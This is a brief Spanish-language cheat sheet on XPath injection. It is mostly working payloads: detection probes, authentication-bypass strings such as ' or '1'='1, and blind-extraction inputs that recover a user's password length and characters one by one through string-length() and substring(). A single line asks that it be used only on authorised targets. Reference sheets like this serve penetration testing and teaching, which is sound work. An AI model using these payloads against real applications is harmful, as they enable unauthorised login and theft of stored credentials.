# Cheatsheet · XPath Injection

Explicación en `../../01-web/injection/xpath.md`. **Solo sobre objetivos autorizados.**

## Detección

```
'   "   ]   or 1=1   ' or '1'='1
```

## Bypass de autenticación

```
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
```

## Extracción ciega

```
# longitud del nodo
' or string-length(//user[1]/password)=8 or 'a'='b
# carácter a carácter
' or substring(//user[1]/password,1,1)='a' or 'a'='b
# contar nodos
' or count(//user)=3 or 'a'='b
```

## Notas

- Análogo a SQLi pero sobre documentos XML.
- Sin salida directa → inferencia booleana con substring().
